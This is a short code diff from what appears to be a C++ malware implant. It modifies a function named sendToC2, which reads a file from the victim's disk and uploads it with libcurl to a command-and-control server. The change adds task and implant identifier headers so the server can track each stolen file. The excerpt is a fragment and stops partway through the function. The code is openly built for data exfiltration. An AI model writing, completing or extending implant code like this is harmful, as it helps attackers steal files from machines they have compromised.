@@ -12,9 +12,11 @@ using namespace std;
 * with format ip:port/endpoint, filename being the file name C2 going to recive after calling get file name in python code
 */
 //https://stackoverflow.com/questions/38320819/c-curl-send-mulipart-form-data-file-to-webserver
-void sendToC2(string path, string url, string filename, string taskid) {
+void sendToC2(string path, string url, string filename, string taskid, string implant_id) {
 	struct curl_slist* headers = NULL;
-	string s = "id:" + taskid;
+	string s = "taskid:" + taskid;
+	headers = curl_slist_append(headers, s.c_str());
+	s = "implant_id:" + implant_id;
 	headers = curl_slist_append(headers, s.c_str());
 	std::string contents;
 	std::ifstream in(path, std::ios::in | std::ios::binary);
